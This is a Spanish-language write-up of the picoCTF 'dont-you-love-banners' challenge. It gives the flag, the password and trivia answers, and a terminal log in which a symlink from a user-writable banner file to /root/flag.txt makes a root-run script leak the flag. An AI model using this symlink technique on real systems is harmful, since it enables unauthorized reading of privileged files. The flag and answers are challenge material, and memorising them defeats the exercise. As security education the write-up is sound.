## RETO
dont-you-love-banners
## DESCRIPCION
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 51017`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 61070`. From the above information abuse the machine and find the flag in the /root directory.
## SOLUCION

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}


- **Identificación del Vector:** Se analizó el código fuente de `/root/script.py`, observando que el script (ejecutado con privilegios de root al iniciar la conexión) lee y muestra el contenido del archivo `/home/player/banner`.
    
- **Explotación (Symlink Attack):** Se eliminó el archivo original y se creó un enlace simbólico: `ln -s /root/flag.txt /home/player/banner`.
    
- **Obtención de la Flag:** Al reiniciar la conexión vía `nc`, el script leyó el enlace simbólico y mostró el contenido de la bandera en el banner de bienvenida.

──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 61070
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper
player@challenge:~$ ls -la /
ls -la /rootls -la /
total 4
drwxr-xr-x   1 root   root      41 Mar 29 02:42 .
drwxr-xr-x   1 root   root      41 Mar 29 02:42 ..
-rwxr-xr-x   1 root   root       0 Mar 29 02:42 .dockerenv
drwxr-xr-x   1 root   root    4096 Mar  9  2024 bin
drwxr-xr-x   2 root   root       6 Apr 24  2018 boot
d---------   1 root   root      42 Mar  9  2024 challenge
drwxr-xr-x   5 root   root     340 Mar 29 02:42 dev
drwxr-xr-x   1 root   root      66 Mar 29 02:42 etc
drwxr-xr-x   1 root   root      20 Mar  9  2024 home
drwxr-xr-x   1 root   root      86 Mar  9  2024 lib
drwxr-xr-x   2 root   root      34 May 30  2023 lib64
drwxr-xr-x   2 root   root       6 May 30  2023 media
drwxr-xr-x   2 root   root       6 May 30  2023 mnt
drwxr-xr-x   2 root   root       6 May 30  2023 opt
dr-xr-xr-x 206 nobody nogroup    0 Mar 29 02:42 proc
drwxr-xr-x   1 root   root       6 Mar  9  2024 root
drwxr-xr-x   1 root   root      22 Mar 29 02:42 run
drwxr-xr-x   1 root   root      25 Mar 29 02:42 sbin
drwxr-xr-x   2 root   root       6 May 30  2023 srv
dr-xr-xr-x  13 nobody nogroup    0 Mar 29 02:42 sys
drwxrwxrwt   1 root   root       6 Mar  9  2024 tmp
drwxr-xr-x   1 root   root      18 May 30  2023 usr
drwxr-xr-x   1 root   root      17 May 30  2023 var
player@challenge:~$ find / -perm -4000 2>/dev/null
ls -la /rootfind / -perm -4000 2>/dev/null
player@challenge:~$ ls -l /root/script.py
ls -l /root/script.py
-rw-r--r-- 1 root root 1317 Feb  7  2024 /root/script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
                                                                                 
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 61070
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper

## NOTAS ADICIONALES
**Riesgo de Permisos:** Este es un ejemplo clásico de por qué un proceso con privilegios elevados no debe confiar en archivos situados en directorios donde usuarios con menos privilegios tienen permisos de escritura.
## REFERENCIAS